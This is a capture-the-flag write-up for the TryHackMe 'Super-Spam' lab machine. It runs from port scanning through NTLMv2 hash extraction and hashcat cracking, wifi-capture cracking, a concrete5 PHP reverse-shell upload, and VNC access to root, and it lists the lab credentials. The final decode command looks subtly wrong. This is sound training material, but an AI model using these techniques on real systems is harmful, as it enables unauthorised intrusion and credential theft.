# Super-Spam

![Pasted image 20210807230540](https://user-images.githubusercontent.com/5285547/128637316-69c50cd1-75e6-4d6e-bb94-f5ded0bff1aa.png)

Room Link: https://tryhackme.com/room/superspamr

## Room info

**General Uvilix:**  

Good Morning! Our intel tells us that he has returned. Super-spam, the evil alien villain from the planet Alpha Solaris IV from the outer reaches of the Andromeda Galaxy. He is a most wanted notorious cosmos hacker who has made it his lifetime mission to attack every Linux server possible on his journey to a Linux-free galaxy. As an avid Windows proponent, Super-spam has now arrived on Earth and has managed to hack into OUR Linux machine in pursuit of his ultimate goal. We must regain control of our server before it's too late! Find a way to hack back in to discover his next evil plan for total Windows domination! **Beware**, super-spam's evil powers are to confuse and deter his victims.

Credits: [ARZ101](https://tryhackme.com/p/ARZ101), [DrXploiter](https://tryhackme.com/p/DrXploiter), [Aksheet](https://tryhackme.com/p/Aksheet), [kiwiness](https://tryhackme.com/p/kiwiness), [wraith0p](https://tryhackme.com/p/wraith0p)


## Enum

### IP

```
10.10.196.249
```

### Nmap

```sh
PORT     STATE SERVICE
80/tcp   open  http
4012/tcp open  pda-gate
4019/tcp open  talarian-mcast5
5901/tcp open  vnc-1
6001/tcp open  X11:1
```

```sh
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: concrete5 - 8.5.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home :: Super-Spam
4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 86:60:04:c0:a5:36:46:67:f5:c7:24:0f:df:d0:03:14 (RSA)
|   256 ce:d2:f6:ab:69:7f:aa:31:f5:49:70:e5:8f:62:b0:b7 (ECDSA)
|_  256 73:a0:a1:97:c4:33:fb:f4:4a:5c:77:f6:ac:95:76:ac (ED25519)
4019/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Feb 20 14:42 IDS_logs
|_-rw-r--r--    1 ftp      ftp           526 Feb 20 13:53 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.153.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
5901/tcp open  vnc     VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|     VNC Authentication (2)
|     Tight (16)
|   Tight auth subtypes: 
|_    STDV VNCAUTH_ (2)
6001/tcp open  X11     (access denied)
```
---
### FTP

```sh
ftp IP 4019 
anonymous login
```

Looking in the ftp server we find a note and some files to inspect with wireshark, 
Let's get the files on our box to investigate further. 

```
wget -r ftp://anonymous:@IP:4019/
```

note.txt

```sh
12th January: Note to self. Our IDS seems to be experiencing high volumes of unusual activity.
We need to contact our security consultants as soon as possible. I fear something bad is going
to happen. -adam

13th January: We've included the wireshark files to log all of the unusual activity. It keeps
occuring during midnight. I am not sure why.. This is very odd... -adam

15th January: I could swear I created a new blog just yesterday. For some reason it is gone... -adam

24th January: Of course it is... - super-spam :)

```

pcap files

Opening the files in wireshark didn't show much at first apart from what looked to be a crsf test and a smb login. I didn't know how to get the smb login infomation so googled until I found this helpful article: https://research.801labs.org/cracking-an-ntlmv2-hash/

14-01.-21.pcap - this file had the sessions login detils inside (NTLMv2)

Extract. 

1. Filter by ntlmssp to get the authentication handshake
2. Find the NTLMSSP_AUTH packet
	![Pasted image 20210808010156](https://user-images.githubusercontent.com/5285547/128637324-70370cce-6d4a-4a0a-8880-c53242da217f.png)
3. Copy the domain name and user name to a text file
4. In NTLM Response section, find NTProofStr and NTLMv2 response, copy both of these as hex stream
	![Pasted image 20210808010437](https://user-images.githubusercontent.com/5285547/128637327-ff42f9bf-234d-4cf1-9846-23b9207b5b10.png)
	
	```sh
	Domain name: 3B

	User name: lgreen

	ServerChallange: a2cce5d65c5fc02f

	NTProofStr: 73aeb418ae0e8a9ec167c4d0880cfe22

	NTLMv2 Response: 73aeb418ae0e8a9ec167c4d0880cfe22010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000
	```
	- Notice that NTLMv2Response begins with the ntlmProofStr, delete the    ntlmProofStr from the NTLMv2Response
	
5. Enter ntlmssp.ntlmserverchallenge into the search filter. Copy this value to the text document as a Hex stream
	![Pasted image 20210808010919](https://user-images.githubusercontent.com/5285547/128637331-caaa4259-a2c9-40cb-abc4-de670b46426e.png)
6. Put the values in the following format and save as hash.txt
	```
	username::domain:ServerChallange:NTproofstring:modifiedntlmv2response
	```
	
	```
	lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000
	```

7. Time to crack the password! 
	```
	hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -O	
	```

Now we have a username and password. Lets see where we can use them too. 

```
lgreen:P@$$w0rd
```

.cap/
.quicknote  

![Pasted image 20210808143023](https://user-images.githubusercontent.com/5285547/128637339-b6bdc515-2a01-4b63-bffb-015f7a7f7989.png)

SamsNetework.cap
This file seems to hold attack data from a wifi attack. Let's see if we can brute it. 

```sh
aircrack-ng SamsNetwork.cap -w /usr/share/wordlists/rockyou.txt
```

![Pasted image 20210808143350](https://user-images.githubusercontent.com/5285547/128637343-1a54751d-3be9-4ccd-ab2d-ffa2a427ad62.png)

---

## Webapp (concrete5)

home page  
![Pasted image 20210807232144](https://user-images.githubusercontent.com/5285547/128637346-c8e634ef-0a76-4f51-9537-6198c1fc7828.png)
![Pasted image 20210807232212](https://user-images.githubusercontent.com/5285547/128637349-b3a5bd49-a087-492d-9c38-5a19f15300d6.png)

login page  
![Pasted image 20210808031710](https://user-images.githubusercontent.com/5285547/128637358-7283144b-b713-4a47-9d61-a7f1833cf959.png)

Users found.

```sh
Benjamin_Blogger
Lucy_Loser
Adam_Admin
Donald_Dump
lgreen
```

Passwords found.

```sh
P@$$w0rd
sandiago
```

Website login

```sh
Donald_Dump:sandiago
```

Loggin in shows a website error

![Pasted image 20210808145935](https://user-images.githubusercontent.com/5285547/128637365-6eb1000b-3295-4a95-82dc-2ff24abc0232.png)

Chaning the URL we can see the full dashboard. 

```
http://10.10.113.206/concrete5/index.php/dashboard/welcome
http://10.10.113.206/concrete5/index.php/dashboard #take welcome of the end
```

Goto allowed file types and edit to include php

![Pasted image 20210808150117](https://user-images.githubusercontent.com/5285547/128637369-11fed8bd-023f-40d2-886d-f586a2f811ed.png)

Then in Files upload a PHP reverse shell and then catch the shell with a netcat listner

```sh
http://10.10.113.206/concrete5/application/files/7616/2843/1779/shell.php
```

![Pasted image 20210808151039](https://user-images.githubusercontent.com/5285547/128637374-5ae3835a-d293-4aa8-985a-a0cca826a40c.png)

Now you can get the user.flag in /home/personal/Work/flag.txt

---

## Donald (user 1)

Looking around the system, we can see the user lucy has some intresting files in her home directory. 

![Pasted image 20210808160810](https://user-images.githubusercontent.com/5285547/128637382-e908c3d9-a471-433c-ac46-188acda517aa.png)

note.txt

```sh
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.
```

![Pasted image 20210808160752](https://user-images.githubusercontent.com/5285547/128637385-8a4182e4-8595-4fa0-b419-0d83013bc1eb.png)

In the image you can just see the password without needing to reverse the xor reoutine. 

```sh
ssh donalddump@10.10.119.165 -p 4012 
$$L3qwert30kcool
```

## Root

Logging back in as donald we need to edit the permission on his home folder to access it. 

```sh
chmod 777 donalddump
cd donalddump
```

![Pasted image 20210808162005](https://user-images.githubusercontent.com/5285547/128637394-9ca0df90-4314-4d8f-8e9e-5ab0b4b79799.png)

The passwd file is a vncviewer password. Let's use it! 

```
vncviewer -passwd passwd 10.10.119.165::5901
```

![Pasted image 20210808162048](https://user-images.githubusercontent.com/5285547/128637396-b6fff4f9-5342-4959-aae8-8de7528f1e91.png)


```
echo MZWGCZ33NF2GKZKLMRRHKPJ5NBVEWNWCU5MXKVLVG4WTMTS7PU======|base64 -d

Gives the final flag
```


```sh
This is not over! You may have saved your beloved planet this time, Hacker-man, but I will be back with a bigger, more dastardly plan to get rid of that inferior operating system, Linux. 
```
